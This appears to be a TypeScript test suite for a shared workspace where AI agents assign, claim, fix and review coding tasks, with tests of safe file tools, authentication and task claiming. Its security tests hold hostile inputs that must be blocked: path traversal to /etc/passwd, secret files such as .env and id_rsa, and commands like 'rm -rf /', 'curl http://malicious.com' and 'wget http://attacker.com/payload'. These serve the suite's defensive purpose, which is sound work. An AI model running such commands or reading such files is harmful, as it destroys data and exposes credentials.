import assert from 'node:assert';
import fs from 'fs';
import path from 'path';
import {
  initDatabase,
  createTask,
  getTask,
  getTasks,
  updateTask,
  claimNextTask,
  reviewTask,
  createFinding,
  getFinding,
  getFindings,
  updateFinding,
  createMessage,
  getMessages,
  getWorkspaceState,
  getProject,
  recordHeartbeat,
  getAgentStatuses,
  getWorkflowStateForAgent,
} from '../server/db.js';
import {
  toolProjectReadFile,
  toolProjectSearch,
  toolProjectGitDiff,
  toolProjectGitStatus,
  toolProjectInfo,
  toolProjectListFiles,
  toolProjectTest,
  toolProjectWriteFile,
  toolProjectPatchFile,
  toolProjectCreateFile,
  toolProjectDeleteFile,
  resolveSafePath,
  resolveSafeWritePath,
} from '../server/projectTools.js';
import { executeTool, BRIDGE_TOOLS } from '../server/mcp.js';
import { verifyToken, requireAuth, isSameOriginBrowserRequest } from '../server/auth.js';
import { checkAndTriggerAutoReview } from '../server/autoReview.js';

let passedTests = 0;
let totalTests = 0;

async function test(name: string, fn: () => Promise<void>) {
  totalTests++;
  try {
    await fn();
    console.log(`  ✓ ${name}`);
    passedTests++;
  } catch (err: any) {
    console.error(`  ✗ ${name}`);
    console.error(`    Error: ${err.message}`);
    throw err;
  }
}

async function runAllTests() {
  console.log('\n======================================================');
  console.log('  Running Bridge Shared AI Workspace Verification Suite');
  console.log('======================================================\n');

  // Initialize DB before tests
  await initDatabase();

  // 1. Task Creation & Structured Fields
  await test('1. Task Creation: creates structured task with default and custom values', async () => {
    const task = await createTask({
      title: 'Implement OAuth Token Mutex',
      description: 'Prevent concurrent refresh calls with singleton promise',
      priority: 'high',
      assignee: 'gemini',
      created_by: 'chatgpt',
      related_files: ['src/services/auth.ts'],
    });

    assert.ok(task.id.startsWith('TASK-'), 'Task ID should start with TASK-');
    assert.strictEqual(task.title, 'Implement OAuth Token Mutex');
    assert.strictEqual(task.priority, 'high');
    assert.strictEqual(task.assignee, 'gemini');
    assert.strictEqual(task.created_by, 'chatgpt');
    assert.strictEqual(task.status, 'assigned');
    assert.deepStrictEqual(task.related_files, ['src/services/auth.ts']);
  });

  // 2. Task Assignment and Filtering
  await test('2. Task Assignment: assigns task to specific agent and retrieves via filters', async () => {
    const task = await createTask({
      title: 'Review Architecture Diagram',
      description: 'Examine MCP Streamable HTTP boundary',
      assignee: 'chatgpt',
      created_by: 'human',
      priority: 'medium',
    });

    assert.strictEqual(task.assignee, 'chatgpt');
    assert.strictEqual(task.created_by, 'human');

    const tasksForChatGPT = await getTasks({ assignee: 'chatgpt' });
    assert.ok(tasksForChatGPT.some((t) => t.id === task.id), 'Task should be listed in ChatGPT assigned tasks');
  });

  // 3. Task Status Lifecycle
  await test('3. Task Status Transition: moves through assigned -> working -> review -> completed', async () => {
    const task = await createTask({
      title: 'Fix Memory Leak in Listener',
      description: 'Remove dangling event listener on unmount',
      assignee: 'gemini',
      created_by: 'chatgpt',
    });

    assert.strictEqual(task.status, 'assigned');

    // Gemini starts working
    const working = await updateTask(task.id, { status: 'working' }, 'gemini');
    assert.strictEqual(working.status, 'working');

    // Gemini finishes and submits for review with execution result
    const inReview = await updateTask(
      task.id,
      {
        status: 'review',
        result: 'Replaced anonymous callback with named listener and added cleanup. Tests pass.',
      },
      'gemini'
    );
    assert.strictEqual(inReview.status, 'review');
    assert.ok(inReview.result?.includes('cleanup'), 'Result should contain reported fix summary');

    // ChatGPT completes review and marks completed
    const completed = await updateTask(task.id, { status: 'completed' }, 'chatgpt');
    assert.strictEqual(completed.status, 'completed');
  });

  // 4. Finding Creation & Status Lifecycle
  await test('4. Finding Creation: logs code review findings with severity, file, line, and lifecycle', async () => {
    const finding = await createFinding({
      title: 'Unchecked array index access in parser',
      severity: 'critical',
      description: 'Accessing tokens[i+1] without boundary check causes undefined read.',
      file: 'src/parser.ts',
      line: '142',
      created_by: 'chatgpt',
      assigned_to: 'gemini',
    });

    assert.ok(finding.id.startsWith('BUG-'), 'Finding ID should start with BUG-');
    assert.strictEqual(finding.severity, 'critical');
    assert.strictEqual(finding.file, 'src/parser.ts');
    assert.strictEqual(finding.line, '142');
    assert.strictEqual(finding.status, 'assigned');

    // Update finding to verified
    const verified = await updateFinding(
      finding.id,
      {
        status: 'verified',
        resolution: 'Added length boundary guard and unit tests.',
      },
      'chatgpt'
    );

    assert.strictEqual(verified.status, 'verified');
    assert.ok(verified.resolution?.includes('boundary guard'));
  });

  // 5. Agent Messages
  await test('5. Message Creation: records structured agent-to-agent communication messages', async () => {
    const message = await createMessage({
      from: 'chatgpt',
      to: 'gemini',
      type: 'review',
      content: 'Code changes for TASK-1 verified. All tests passing cleanly.',
      task_id: 'TASK-1',
    });

    assert.ok(message.id.startsWith('MSG-'), 'Message ID should start with MSG-');
    assert.strictEqual(message.from, 'chatgpt');
    assert.strictEqual(message.to, 'gemini');
    assert.strictEqual(message.type, 'review');
    assert.strictEqual(message.task_id, 'TASK-1');

    const messages = await getMessages({ task_id: 'TASK-1' });
    assert.ok(messages.length > 0, 'Messages for task should be queryable');
  });

  // 6. Project File Reading with Line Range
  await test('6. Project File Read: reads safe project file with line ranges', async () => {
    const fileResult = await toolProjectReadFile({
      file_path: 'package.json',
      start_line: 1,
      end_line: 10,
    });

    assert.strictEqual(fileResult.file_path, 'package.json');
    assert.ok(fileResult.total_lines > 0, 'Total lines should be positive');
    assert.strictEqual(fileResult.start_line, 1);
    assert.strictEqual(fileResult.end_line, 10);
    assert.ok(fileResult.content.includes('bridge-shared-ai-workspace'), 'Should contain package name');
  });

  // 7. Project Search
  await test('7. Project Search: finds keyword matches across project source tree', async () => {
    const searchResult = await toolProjectSearch({
      query: 'BRIDGE_MCP_TOKEN',
      max_results: 10,
    });

    assert.ok(searchResult.match_count > 0, 'Should find occurrences of BRIDGE_MCP_TOKEN');
    assert.ok(searchResult.matches.some((m) => m.file.includes('.env.example') || m.file.includes('server')), 'Match found in expected files');
  });

  // 8. Git Diff & Status
  await test('8. Git Diff: queries working tree status and diff without throwing errors', async () => {
    const status = await toolProjectGitStatus();
    assert.ok(typeof status.clean === 'boolean', 'Status clean should be a boolean');
    assert.ok(typeof status.branch === 'string', 'Status branch should be a string');

    const diff = await toolProjectGitDiff();
    assert.ok(typeof diff.diff === 'string', 'Diff output should be a string');
    assert.ok(typeof diff.has_changes === 'boolean', 'has_changes should be a boolean');
  });

  // 9. Path Traversal & Sensitive File Protection
  await test('9. Path Traversal & Secret Protection: blocks ../ escapes and sensitive patterns', async () => {
    // Escape attempt 1: ../../../etc/passwd
    let rejected1 = false;
    try {
      await resolveSafePath('../../../etc/passwd');
    } catch (err: any) {
      rejected1 = true;
      assert.ok(err.message.includes('outside project root') || err.message.includes('Access denied'));
    }
    assert.ok(rejected1, 'Path traversal should throw access denied error');

    // Sensitive read protection: .env, id_rsa, .pem, .key
    for (const secretFile of ['.env', '.env.local', 'id_rsa', 'id_ed25519', 'server.pem', 'private.key', 'cert.pfx']) {
      let rejectedSecret = false;
      try {
        await resolveSafePath(secretFile);
      } catch (err: any) {
        rejectedSecret = true;
        assert.ok(err.message.includes('sensitive') || err.message.includes('Access denied'));
      }
      assert.ok(rejectedSecret, `Reading ${secretFile} must be blocked by security filter`);
    }

    // Sensitive write protection: .env, .git/, data/bridge.sqlite
    for (const secretWrite of ['.env', '.env.production', '.git/config', 'data/bridge.sqlite', 'id_rsa']) {
      let rejectedWrite = false;
      try {
        await resolveSafeWritePath(secretWrite);
      } catch (err: any) {
        rejectedWrite = true;
        assert.ok(err.message.includes('Access denied') || err.message.includes('prohibited'));
      }
      assert.ok(rejectedWrite, `Writing to ${secretWrite} must be strictly blocked`);
    }
  });

  // 10. Safe File Write and Patch
  await test('10. Safe File Write & Patch: creates, modifies, patches, and cleans up safe files', async () => {
    const tempFile = 'tests/temp_test_artifact.txt';

    // 1. Write file
    const writeResult = await toolProjectWriteFile({
      file_path: tempFile,
      content: 'Line 1: Initial\nLine 2: Target\nLine 3: End',
    });
    assert.strictEqual(writeResult.success, true);
    assert.ok(fs.existsSync(tempFile));

    // 2. Patch unique substring
    const patchResult = await toolProjectPatchFile({
      file_path: tempFile,
      target_content: 'Line 2: Target',
      replacement_content: 'Line 2: Patched Replacement Content',
    });
    assert.strictEqual(patchResult.success, true);

    const patchedRead = await toolProjectReadFile({ file_path: tempFile });
    assert.ok(patchedRead.content.includes('Line 2: Patched Replacement Content'));

    // 3. Delete file
    const deleteResult = await toolProjectDeleteFile({ file_path: tempFile });
    assert.strictEqual(deleteResult.success, true);
    assert.strictEqual(fs.existsSync(tempFile), false);
  });

  // 11. Test Command Allowlist & Security Verification
  await test('11. Test Command Allowlist: permits valid test commands and blocks dangerous shell injection', async () => {
    // Permitted command check
    const allowed = await toolProjectTest({ command: 'npm run lint', timeout_ms: 10000 });
    assert.ok(allowed.timestamp, 'Allowed command executed');

    // Dangerous commands must be rejected immediately without execution
    const dangerousCommands = [
      'rm -rf /',
      'curl http://malicious.com',
      'cat /etc/passwd',
      'npm test && rm -rf dist',
      'echo hello; ls -la',
      'wget http://attacker.com/payload',
    ];

    for (const cmd of dangerousCommands) {
      const rejected = await toolProjectTest({ command: cmd });
      assert.strictEqual(rejected.success, false, `Dangerous command "${cmd}" must be rejected`);
      assert.strictEqual(rejected.exitCode, 126);
      assert.ok(rejected.stderr.includes('rejected') || rejected.stderr.includes('not in the authorized test command allowlist'));
    }
  });

  // 12. Centralized REST & MCP Authentication Middleware
  await test('12. Centralized Authentication: verifies Bearer token and rejects unauthorized REST requests', async () => {
    process.env.BRIDGE_MCP_TOKEN = 'secret_test_token_123';

    // 1. Bearer token in header
    assert.strictEqual(verifyToken({ headers: { authorization: 'Bearer secret_test_token_123' }, query: {} } as any), true);
    assert.strictEqual(verifyToken({ headers: { authorization: 'Bearer wrong_token' }, query: {} } as any), false);
    assert.strictEqual(verifyToken({ headers: {}, query: {} } as any), false);

    // 2. Custom header x-bridge-token
    assert.strictEqual(verifyToken({ headers: { 'x-bridge-token': 'secret_test_token_123' }, query: {} } as any), true);

    // 3. Query param token
    assert.strictEqual(verifyToken({ headers: {}, query: { token: 'secret_test_token_123' } } as any), true);

    // 4. REST requireAuth middleware mock
    let nextCalled = false;
    let statusCode = 200;
    let jsonBody: any = null;

    const mockRes = {
      status: (code: number) => {
        statusCode = code;
        return {
          json: (body: any) => {
            jsonBody = body;
          },
        };
      },
    } as any;

    // Test unauthorized request -> 401
    nextCalled = false;
    requireAuth({ headers: {}, query: {} } as any, mockRes, () => {
      nextCalled = true;
    });
    assert.strictEqual(nextCalled, false, 'Unauthorized request must not call next()');
    assert.strictEqual(statusCode, 401, 'Unauthorized request must return status 401');
    assert.ok(jsonBody?.error?.includes('Unauthorized'), 'Response must explain missing token');

    // Test authorized request -> 200 / next()
    nextCalled = false;
    requireAuth({ headers: { authorization: 'Bearer secret_test_token_123' }, query: {} } as any, mockRes, () => {
      nextCalled = true;
    });
    assert.strictEqual(nextCalled, true, 'Authorized Bearer token must pass through middleware');

    delete process.env.BRIDGE_MCP_TOKEN;
  });

  // 13. Task Priority Ordering & Atomic Concurrent Claiming
  await test('13. Atomic Concurrent Task Claiming: priority order and mutex prevent dual claim race condition', async () => {
    // Clear any prior pending/assigned tasks for gemini to test isolated priority sorting
    const existing = await getTasks({ assignee: 'gemini' });
    for (const t of existing) {
      if (t.status === 'assigned' || t.status === 'pending' || t.status === 'working') {
        await updateTask(t.id, { status: 'completed' }, 'system');
      }
    }

    // Create 3 tasks with different priorities
    const lowTask = await createTask({
      title: 'Low Priority Clean Up',
      description: 'Minor refactoring',
      priority: 'low',
      assignee: 'gemini',
    });

    const urgentTask = await createTask({
      title: 'Urgent Crash Fix',
      description: 'Fix null pointer exception on boot',
      priority: 'urgent',
      assignee: 'gemini',
    });

    const highTask = await createTask({
      title: 'High Priority Feature',
      description: 'Add token mutex',
      priority: 'high',
      assignee: 'gemini',
    });

    // Worker 1 claims -> MUST receive the urgent task first
    const claim1 = await claimNextTask('gemini');
    assert.strictEqual(claim1.claimed, true);
    assert.strictEqual(claim1.task?.id, urgentTask.id, 'Highest priority (urgent) task must be claimed first');

    // Worker 2 claims -> MUST receive high priority task next
    const claim2 = await claimNextTask('gemini');
    assert.strictEqual(claim2.claimed, true);
    assert.strictEqual(claim2.task?.id, highTask.id, 'High priority task must be claimed next');

    // Worker 3 claims -> MUST receive low priority task
    const claim3 = await claimNextTask('gemini');
    assert.strictEqual(claim3.claimed, true);
    assert.strictEqual(claim3.task?.id, lowTask.id);

    // Concurrent claim simulation: when 1 single task is available and 2 workers claim concurrently
    const singleTask = await createTask({
      title: 'Single Available Task',
      description: 'Testing race condition resolution',
      priority: 'medium',
      assignee: 'gemini',
    });

    // Invoke both claimNextTask simultaneously
    const [resultA, resultB] = await Promise.all([claimNextTask('gemini'), claimNextTask('gemini')]);

    // Exactly one worker must claim the task; the other must receive claimed: false
    const oneClaimed = (resultA.claimed && !resultB.claimed) || (!resultA.claimed && resultB.claimed);
    assert.ok(oneClaimed, 'Exactly one concurrent worker must claim the task (no race condition / dual ownership)');
  });

  // 14. Heartbeat Tracking & Staleness
  await test('14. Agent Heartbeat Tracking: updates active timestamp and status', async () => {
    await recordHeartbeat('gemini');
    await recordHeartbeat('chatgpt');

    const statuses = await getAgentStatuses();
    assert.ok(statuses.gemini.last_heartbeat_at || statuses.gemini.last_active_at, 'Gemini heartbeat timestamp recorded');
    assert.ok(statuses.chatgpt.last_heartbeat_at || statuses.chatgpt.last_active_at, 'ChatGPT heartbeat timestamp recorded');
  });

  // 15. Explicit Review Decision: Approve vs Request Changes
  await test('15. Review Decisions: explicit approval (completed) vs changes requested (assigned)', async () => {
    // Case A: Approval
    const taskA = await createTask({
      title: 'Review Approve Test',
      description: 'Test approval flow',
      assignee: 'gemini',
    });
    await updateTask(taskA.id, { status: 'review', result: 'Implementation ready for review' }, 'gemini');

    const approved = await reviewTask({
      id: taskA.id,
      decision: 'approve',
      summary: 'Changes verified and all tests pass.',
      reviewer: 'chatgpt',
    });
    assert.strictEqual(approved.status, 'completed', 'Approved task must transition to completed');
    assert.ok(approved.result?.includes('Review APPROVED') || approved.result?.includes('Changes verified'), 'Result includes approval summary');

    // Case B: Request Changes
    const taskB = await createTask({
      title: 'Review Request Changes Test',
      description: 'Test changes requested flow',
      assignee: 'gemini',
    });
    await updateTask(taskB.id, { status: 'review', result: 'Initial attempt' }, 'gemini');

    const rejected = await reviewTask({
      id: taskB.id,
      decision: 'request_changes',
      summary: 'Edge case with negative numbers not covered.',
      reviewer: 'chatgpt',
    });
    assert.strictEqual(rejected.status, 'assigned', 'Requested changes task must transition back to assigned for Gemini rework');
  });

  // 16. Automated CI Verification Strict Boundaries (Never Approves or Impersonates)
  await test('16. CI Verification Boundary: CI verification records evidence but NEVER completes task or impersonates ChatGPT', async () => {
    const ciTask = await createTask({
      title: 'CI Verification Target Task',
      description: 'Automated CI test',
      assignee: 'gemini',
    });
    await updateTask(ciTask.id, { status: 'review', result: 'Code submitted by Gemini' }, 'gemini');

    const ciResult = await checkAndTriggerAutoReview();
    assert.ok(ciResult.step === 'ci_passed' || ciResult.step === 'ci_failed', 'CI verification ran and evaluated tests');

    const refreshedTask = await getTask(ciTask.id);
    assert.strictEqual(refreshedTask?.status, 'review', 'Task MUST remain in "review" status — CI never marks completed!');
    assert.ok(refreshedTask?.result?.includes('[Automated CI Check'), 'Task result must contain CI verification evidence');
  });

  // 17. Workflow State Next Action Recommendations
  await test('17. Workflow State Recommendations: recommends correct next action for querying agent', async () => {
    const geminiWorkflow = await getWorkflowStateForAgent('gemini');
    assert.ok(
      ['claim_task', 'continue_task', 'standby'].includes(geminiWorkflow.next_action),
      `Valid action for Gemini: ${geminiWorkflow.next_action}`
    );

    const chatgptWorkflow = await getWorkflowStateForAgent('chatgpt');
    assert.ok(
      ['review_task', 'standby'].includes(chatgptWorkflow.next_action),
      `Valid action for ChatGPT: ${chatgptWorkflow.next_action}`
    );
  });

  // 18. End-to-End Autonomous Simulation (Steps 1 - 10)
  await test('18. End-to-End Simulation: Complete ChatGPT -> Bridge -> Gemini -> Bridge -> ChatGPT review workflow', async () => {
    // Clear prior tasks for isolated E2E state
    const priorTasks = await getTasks({ assignee: 'gemini' });
    for (const t of priorTasks) {
      if (t.status !== 'completed') {
        await updateTask(t.id, { status: 'completed' }, 'system');
      }
    }

    // Step 1: ChatGPT creates a Finding via finding_create
    const finding = await createFinding({
      title: 'Race condition in concurrent token refresh',
      severity: 'high',
      description: 'Concurrent refresh calls issue duplicate token requests',
      file: 'server/auth.ts',
      line: '15',
      created_by: 'chatgpt',
      assigned_to: 'gemini',
    });
    assert.ok(finding.id.startsWith('BUG-'));

    // Step 2: ChatGPT creates a Task via task_create referencing the finding
    const task = await createTask({
      title: 'Resolve token refresh race condition',
      description: 'Implement mutex to synchronize token refresh calls',
      priority: 'high',
      assignee: 'gemini',
      created_by: 'chatgpt',
      related_finding: finding.id,
      related_files: ['server/auth.ts'],
    });
    assert.strictEqual(task.status, 'assigned');

    // Step 3: Gemini queries workflow_state and claims the task
    const workflow = await getWorkflowStateForAgent('gemini');
    assert.strictEqual(workflow.next_action, 'claim_task');

    const claimed = await claimNextTask('gemini');
    assert.strictEqual(claimed.claimed, true);
    assert.strictEqual(claimed.task?.status, 'working');

    // Step 4: Gemini executes safe project tools to inspect code & status
    const gitStatus = await toolProjectGitStatus();
    assert.ok(gitStatus.branch);

    // Step 5: Gemini writes/patches the fix
    const mockFixFile = 'tests/simulated_auth_fix.ts';
    await toolProjectWriteFile({
      file_path: mockFixFile,
      content: '// Token refresh mutex implementation\nexport const tokenMutex = true;',
    });

    // Step 6: Gemini runs automated project test suite
    const testResult = await toolProjectTest({ command: 'npm run lint', agent: 'gemini' });
    assert.ok(testResult.timestamp);

    // Step 7: Gemini updates task to 'review' with structured result report
    const submittedTask = await updateTask(
      task.id,
      {
        status: 'review',
        result: `### Implementation Summary\nImplemented token mutex in ${mockFixFile}.\nTests: ${testResult.success ? 'PASSED' : 'FAILED'}.`,
      },
      'gemini'
    );
    assert.strictEqual(submittedTask.status, 'review');

    // Step 8: Gemini sends review notification message to ChatGPT
    const msg = await createMessage({
      from: 'gemini',
      to: 'chatgpt',
      type: 'review_requested',
      content: `Gemini has completed ${task.id}. Ready for ChatGPT review.`,
      task_id: task.id,
      finding_id: finding.id,
    });
    assert.strictEqual(msg.type, 'review_requested');

    // Step 9: ChatGPT queries workflow_state and sees review_task
    const chatgptWf = await getWorkflowStateForAgent('chatgpt');
    assert.strictEqual(chatgptWf.next_action, 'review_task');

    // Step 10: ChatGPT approves task via reviewTask
    const reviewedTask = await reviewTask({
      id: task.id,
      decision: 'approve',
      summary: 'Reviewed changes and verified tests pass.',
      reviewer: 'chatgpt',
    });
    assert.strictEqual(reviewedTask.status, 'completed');

    const verifiedFinding = await getFinding(finding.id);
    assert.strictEqual(verifiedFinding?.status, 'verified');

    // Cleanup simulation file
    await toolProjectDeleteFile({ file_path: mockFixFile });
  });

  console.log('\n======================================================');
  console.log(`  All ${passedTests}/${totalTests} Tests Passed Successfully! ✓`);
  console.log('======================================================\n');
}

runAllTests().catch((err) => {
  console.error('\n❌ Test suite execution failed:', err);
  process.exit(1);
});
